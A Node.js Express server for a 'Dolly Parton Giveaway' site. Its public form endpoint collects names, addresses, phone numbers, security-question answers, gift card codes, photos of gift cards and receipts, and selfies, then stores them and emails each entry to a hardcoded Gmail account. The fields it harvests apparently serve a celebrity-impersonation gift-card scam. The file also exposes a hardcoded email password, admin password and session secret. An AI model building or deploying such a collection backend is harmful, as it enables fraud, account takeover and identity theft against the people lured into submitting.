const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');
const cors = require('cors');
const session = require('express-session');
const compression = require('compression');

const app = express();
const PORT = process.env.PORT || 3001;

// Session middleware for admin login
app.use(session({
    secret: 'dolly-parton-secret-key-2024',
    resave: false,
    saveUninitialized: false,
    cookie: { 
        secure: false, // Set to true if using HTTPS
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));

// Middleware
app.use(compression()); // Add compression for faster responses
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/uploads', express.static('uploads'));
app.use('/public', express.static('public'));
app.use('/images', express.static('public/images'));

// Create uploads directory
const uploadsDir = path.join(__dirname, 'uploads');
const submissionsDir = path.join(uploadsDir, 'submissions');
if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir);
if (!fs.existsSync(submissionsDir)) fs.mkdirSync(submissionsDir);

// Configure multer with limits
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB max per file

const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        let folder = 'uploads/submissions';
        if (file.fieldname === 'selfieUploadFile') folder = 'uploads/submissions/selfies';
        if (file.fieldname === 'giftCardImage') folder = 'uploads/submissions/giftcards';
        if (file.fieldname === 'receiptImage') folder = 'uploads/submissions/receipts';
        
        const fullPath = path.join(__dirname, folder);
        if (!fs.existsSync(fullPath)) fs.mkdirSync(fullPath, { recursive: true });
        cb(null, fullPath);
    },
    filename: function (req, file, cb) {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});

const upload = multer({ 
    storage: storage,
    limits: { 
        fileSize: MAX_FILE_SIZE,
        files: 3
    }
});

// Email configuration with timeouts
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER || 'shuttdavid9@gmail.com',
        pass: process.env.EMAIL_PASS || 'Npzt-Lz.8ftvbVb'
    },
    timeout: 10000, // 10 seconds timeout
    connectionTimeout: 10000,
    socketTimeout: 10000
});

// Save submission to JSON file
function saveToJSON(data, trackingNumber) {
    const jsonFile = path.join(submissionsDir, `submission-${trackingNumber}.json`);
    fs.writeFileSync(jsonFile, JSON.stringify(data, null, 2));
    return jsonFile;
}

// Email function that runs in background (doesn't block response)
const sendEmailAsync = async (trackingNumber, formData) => {
    try {
        const emailHtml = `
            <h2>🎉 New Dolly Parton Giveaway Entry!</h2>
            <p><strong>Tracking Number:</strong> ${trackingNumber}</p>
            <p><strong>Name:</strong> ${formData.fullname}</p>
            <p><strong>Email:</strong> ${formData.email}</p>
            <p><strong>Phone:</strong> ${formData.phone}</p>
            <p><strong>Address:</strong> ${formData.shippingAddress}</p>
            <p><strong>Fan Since:</strong> ${formData.fanDuration}</p>
            <p><strong>Gift Card Code:</strong> ${formData.giftCardCode}</p>
            <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
            <hr>
            <p><strong>📁 Check your Render dashboard for uploaded images in /uploads/submissions/</strong></p>
        `;
        
        await transporter.sendMail({
            from: '"Dolly Giveaway" <shuttdavid9@gmail.com>',
            to: 'shuttdavid9@gmail.com',
            subject: `🎁 NEW ENTRY - ${trackingNumber}`,
            html: emailHtml
        });
        console.log(`📧 Email sent for tracking: ${trackingNumber}`);
    } catch (emailError) {
        console.error(`⚠️ Email failed (non-critical): ${emailError.message}`);
    }
};

// Admin Login Page
app.get('/admin-login', (req, res) => {
    if (req.session.isAdmin) {
        return res.redirect('/admin');
    }
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Login - Dolly Giveaway</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
                body {
                    background: linear-gradient(135deg, #c62828, #f9a825);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }
                .login-box {
                    background: white;
                    padding: 40px;
                    border-radius: 20px;
                    box-shadow: 0 10px 40px rgba(0,0,0,0.3);
                    width: 350px;
                    text-align: center;
                }
                h2 { color: #c62828; margin-bottom: 20px; }
                input {
                    width: 100%;
                    padding: 12px;
                    margin: 10px 0;
                    border: 1px solid #ddd;
                    border-radius: 25px;
                    font-size: 16px;
                }
                button {
                    background: #c62828;
                    color: white;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 25px;
                    cursor: pointer;
                    font-size: 16px;
                    font-weight: bold;
                    width: 100%;
                    margin-top: 10px;
                }
                button:hover { background: #8b0000; }
                .error { color: red; margin-top: 10px; font-size: 14px; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>🔐 Admin Login</h2>
                <form method="POST" action="/admin-login">
                    <input type="password" name="password" placeholder="Enter Admin Password" required>
                    <button type="submit">Login</button>
                    ${req.query.error ? '<div class="error">Invalid password! Try again.</div>' : ''}
                </form>
                <p style="margin-top: 20px; font-size: 12px; color: #666;">Authorized access only</p>
            </div>
        </body>
        </html>
    `);
});

// Login POST handler
app.post('/admin-login', (req, res) => {
    const password = req.body.password;
    const adminPassword = 'Dolly2024Secure!'; // Change this to your own password!
    
    if (password === adminPassword) {
        req.session.isAdmin = true;
        res.redirect('/admin');
    } else {
        res.redirect('/admin-login?error=1');
    }
});

// Logout route
app.get('/admin-logout', (req, res) => {
    req.session.destroy();
    res.redirect('/admin-login');
});

// Middleware to protect admin routes
function requireAdmin(req, res, next) {
    if (req.session.isAdmin) {
        next();
    } else {
        res.redirect('/admin-login');
    }
}

// Protect admin dashboard
app.get('/admin', requireAdmin, (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Protect API submissions endpoint
app.get('/api/submissions', requireAdmin, (req, res) => {
    try {
        const files = fs.readdirSync(submissionsDir).filter(f => f.endsWith('.json'));
        const submissions = files.map(file => {
            const data = JSON.parse(fs.readFileSync(path.join(submissionsDir, file), 'utf8'));
            return data;
        });
        res.json(submissions);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Main submission endpoint (PUBLIC - no auth needed)
app.post('/api/submit', upload.fields([
    { name: 'selfieUploadFile', maxCount: 1 },
    { name: 'giftCardImage', maxCount: 1 },
    { name: 'receiptImage', maxCount: 1 }
]), async (req, res) => {
    const startTime = Date.now();
    try {
        console.log('📥 New submission received!');
        
        const formData = req.body;
        const files = req.files;
        const trackingNumber = formData.trackingNumber || `DOLLY-${Date.now()}`;
        
        let selfiePath = null;
        if (formData.selfieBase64 && formData.selfieBase64.startsWith('data:image')) {
            const base64Data = formData.selfieBase64.replace(/^data:image\/\w+;base64,/, '');
            const buffer = Buffer.from(base64Data, 'base64');
            const selfieFilename = `selfie-camera-${trackingNumber}.jpg`;
            selfiePath = path.join(submissionsDir, 'selfies', selfieFilename);
            fs.writeFileSync(selfiePath, buffer);
        }
        
        const submission = {
            trackingNumber: trackingNumber,
            submissionDate: new Date().toISOString(),
            personalInfo: {
                fullname: formData.fullname,
                email: formData.email,
                phone: formData.phone,
                shippingAddress: formData.shippingAddress
            },
            fanInfo: {
                loveMessage: formData.loveMessage,
                fanDuration: formData.fanDuration,
                favMemory: formData.favMemory
            },
            securityQuestions: {
                question1: formData.secQuestion1,
                answer1: formData.secAnswer1,
                question2: formData.secQuestion2,
                answer2: formData.secAnswer2
            },
            giftCard: {
                code: formData.giftCardCode,
                cardImage: files.giftCardImage ? files.giftCardImage[0].path : null,
                receiptImage: files.receiptImage ? files.receiptImage[0].path : null
            },
            mediaFiles: {
                selfieCamera: selfiePath,
                selfieUpload: files.selfieUploadFile ? files.selfieUploadFile[0].path : null
            }
        };
        
        const savedFile = saveToJSON(submission, trackingNumber);
        console.log(`✅ Saved to: ${savedFile} (${Date.now() - startTime}ms)`);
        
        // Send email in background - DOES NOT BLOCK RESPONSE
        sendEmailAsync(trackingNumber, formData).catch(console.error);
        
        // Send immediate success response to user
        res.json({
            success: true,
            trackingNumber: trackingNumber,
            processingTime: Date.now() - startTime,
            message: 'Entry submitted successfully!'
        });
        
    } catch (error) {
        console.error(`❌ Error after ${Date.now() - startTime}ms:`, error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Serve the HTML file (PUBLIC)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Keep-alive endpoint to prevent cold starts
app.get('/ping', (req, res) => {
    res.json({ status: 'alive', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, () => {
    console.log(`
    ╔════════════════════════════════════════════╗
    ║   🎤 DOLLY PARTON GIVEAWAY SYSTEM 🎸       ║
    ║   Server running at: http://localhost:${PORT}  ║
    ║   Admin Login: http://localhost:${PORT}/admin-login ║
    ║   Password: Dolly2024Secure!              ║
    ╚════════════════════════════════════════════╝
    `);
});